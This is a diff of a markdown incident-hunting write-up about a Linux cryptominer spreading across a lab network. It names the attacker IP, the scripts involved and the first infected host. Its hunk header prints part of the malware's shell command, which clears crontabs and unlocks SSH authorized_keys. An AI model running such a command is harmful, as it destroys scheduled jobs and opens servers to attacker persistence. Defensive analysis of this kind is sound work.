@@ -592,7 +592,16 @@ bash -c "crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /v
 ![image](https://github.com/user-attachments/assets/c31054ab-c0e8-44e0-9821-a500751a37cd)
 ![image](https://github.com/user-attachments/assets/eda92468-62ec-4575-b6e6-74476c5e593a)
 
+Based on this deviation from the behavior, it seems that some patterns differ. However we did secure one common pattern and that is the IP address 196.251.73.38 for connection requests for the MNFleGNm file, as we recall is ns1432.ztomy.com located in Amsterdam, the malicious and miner IP. Following this discovery, I queried the network for the remote IP and found four of the six devices in question to have connection requests to obsfucated files or scripts.
 
+![image](https://github.com/user-attachments/assets/cf3d662a-bcaa-4682-9296-24d20ce0a4e6)
+![image](https://github.com/user-attachments/assets/b9dee791-6692-4c0a-bfc0-a4ad17df7a3a)
+
+With this I believe we can within a certain margin of error, conclude that this is the most that advanced hunting on MDE will get us. The patterns seem to repeat in a mmaner of the attacker gains access to Linux Ubuntu Servers, somehow runs a legitmate MOTD to begin the recon chain and perhaps file creation, leading to another login that pushes a scp command to begin the attack chain. The question now is how did this malware proliferate among the network, my theory is the .x/network script that probes the internal network once from the infected devices. This would allow a script to attempt to gain access to misconfigured devices as the cyber range conducts labs that intentionally misconfigure devices.
+
+The question on our minds now would be "What was the first machine to have this malware in the network?", with MDE Device Invetory and MDE Incidents, we see that the first machine to run a retea script is linuxprogramfixjay on January 9th at 0639 AM, following the same set of patterns observed on the linux program fix device with a slight change to the order of operations. Where retea is initially executed without an obsfucated file to initiate, now it seems to rely on executing retea after running a obsfucated script.
+
+![image](https://github.com/user-attachments/assets/1a3efa81-3ac0-4893-85a0-53b684aa630b)
 
 
 ### Summary of Findings
